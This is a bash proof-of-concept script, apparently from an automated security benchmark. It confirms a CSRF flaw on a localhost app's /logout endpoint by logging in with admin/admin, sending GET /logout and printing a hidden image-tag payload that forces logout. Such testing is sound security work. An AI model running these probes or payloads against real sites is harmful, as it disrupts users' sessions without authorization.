#!/bin/bash
# POC: CSRF vulnerability on logout endpoint - demonstrates that GET requests trigger logout without CSRF token protection
# Target: ./repo
# Created: 2025-11-06T19:22:39.605Z
# Session: benchmark-XBEN-032-24-mhnsyr54

# CSRF Vulnerability POC: Logout accepts GET requests without CSRF token protection
# This script demonstrates that the /logout endpoint can be triggered via GET requests
# allowing an attacker to force logout via CSRF attacks

TARGET="http://localhost:80"
LOGOUT_ENDPOINT="/logout"

echo "=== CSRF Vulnerability POC: Logout via GET Request ==="
echo ""

# Step 1: Create a session by logging in
echo "[*] Step 1: Creating an authenticated session..."
echo "POST /login with credentials:"
SESSION_COOKIE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST "${TARGET}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin" \
  -w "\n" | grep -o 'session=[^;]*' || echo "")

echo "Login response received"
echo ""

# Step 2: Verify we have an authenticated session
echo "[*] Step 2: Verifying authenticated session..."
AUTH_CHECK=$(curl -s -b /tmp/cookies.txt "${TARGET}/login" -w "\n%{http_code}\n" -o /dev/null)
echo "Session status: HTTP $AUTH_CHECK"
echo ""

# Step 3: Test that GET request to /logout triggers logout (CSRF vulnerability)
echo "[*] Step 3: Testing CSRF vulnerability - GET request to /logout..."
LOGOUT_RESPONSE=$(curl -s -i -b /tmp/cookies.txt "${TARGET}${LOGOUT_ENDPOINT}" 2>&1)
LOGOUT_CODE=$(echo "$LOGOUT_RESPONSE" | grep "HTTP" | head -1)
LOGOUT_LOCATION=$(echo "$LOGOUT_RESPONSE" | grep -i "^Location:" | head -1)

echo "Response Status: $LOGOUT_CODE"
echo "Response Headers:"
echo "$LOGOUT_RESPONSE" | head -15
echo ""

# Step 4: Verify that POST to /logout returns 405 (only GET accepted)
echo "[*] Step 4: Verifying that POST requests are not supported..."
POST_RESPONSE=$(curl -s -i -b /tmp/cookies.txt -X POST "${TARGET}${LOGOUT_ENDPOINT}" 2>&1)
POST_CODE=$(echo "$POST_RESPONSE" | grep "HTTP" | head -1)
echo "POST /logout Response: $POST_CODE"
echo ""

# Step 5: Demonstrate CSRF attack via image tag (simulated)
echo "[*] Step 5: CSRF Attack Simulation - Image Tag Payload"
echo "An attacker can use the following HTML to force logout:"
echo "<img src=\"${TARGET}${LOGOUT_ENDPOINT}\" alt=\"image\" style=\"display:none;\">"
echo ""
echo "When an authenticated user's browser loads this image tag:"
echo "- The browser sends a GET request to ${TARGET}${LOGOUT_ENDPOINT}"
echo "- The request includes the user's session cookies (automatically)"
echo "- The logout endpoint processes the GET request (no CSRF token required)"
echo "- The user is logged out without their knowledge"
echo ""

# Step 6: Verify vulnerability criteria
echo "[*] Step 6: Vulnerability Confirmation:"
echo ""

# Check if GET returns 302
if echo "$LOGOUT_RESPONSE" | grep -q "HTTP/1.1 302"; then
    echo "✓ GET /logout returns HTTP 302 (state-changing operation via GET)"
else
    echo "✗ GET /logout does not return 302"
fi

# Check if no CSRF token is in the response
if ! echo "$LOGOUT_RESPONSE" | grep -q "csrf"; then
    echo "✓ No CSRF token protection in logout endpoint"
else
    echo "✗ CSRF token found in response"
fi

# Check if POST returns 405
if echo "$POST_RESPONSE" | grep -q "HTTP/1.1 405"; then
    echo "✓ POST /logout returns 405 Method Not Allowed (only GET accepted)"
else
    echo "✗ POST /logout does not return 405"
fi

# Check if Location header is present
if echo "$LOGOUT_RESPONSE" | grep -q "Location:"; then
    echo "✓ Logout endpoint redirects to login page"
else
    echo "✗ No redirect location header"
fi

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo "The /logout endpoint is vulnerable to CSRF attacks:"
echo "1. Accepts GET requests for logout (state-changing operation)"
echo "2. No CSRF token protection required"
echo "3. Returns 302 redirect to /login"
echo "4. Automatically sends session cookies with GET request"
echo ""
echo "An attacker can force logout by embedding:"
echo "  - <img> tags pointing to /logout"
echo "  - <link> tags pointing to /logout"
echo "  - <iframe> tags pointing to /logout"
echo "  - JavaScript redirects to /logout"
echo ""

# Cleanup
rm -f /tmp/cookies.txt